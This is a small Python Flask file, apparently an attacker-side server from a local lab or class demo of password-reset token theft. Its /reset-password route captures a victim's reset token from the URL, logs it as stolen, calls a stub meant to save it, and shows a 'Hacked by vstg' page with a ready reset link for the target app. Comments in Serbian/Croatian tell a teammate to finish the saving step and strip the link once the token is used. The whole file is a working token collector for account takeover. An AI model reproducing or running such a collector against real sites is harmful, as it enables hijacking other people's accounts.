from flask import Flask, request
from modules import save_to_file

app = Flask(__name__)



#html
ATTACKER_HTML = """
<h1>Hacked by vstg</h1>

<p>Stolen token:</p>
<code>{token}</code>

<hr>

<p>We have your token</p>

<a href="http://127.0.0.1:5000/reset-password?token={token}">http://127.0.0.1:5000/reset-password?token={token}</a>
"""



@app.route("/reset-password")
def steal_token():
    #get vraca token iz url
    token = request.args.get("token")

    print(f"[ATTACKER] Token stolen: {token}")
    print(f"http://127.0.0.1:5000/reset-password?token={token}\n")
    
    #Teso implementiraj ovu funkciju i obrisi zadnju liniju u html kad je iskoristis
    save_to_file()

    #ispis stranice
    return ATTACKER_HTML.format(token=token)

#pokretanje servera
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8000, debug=True)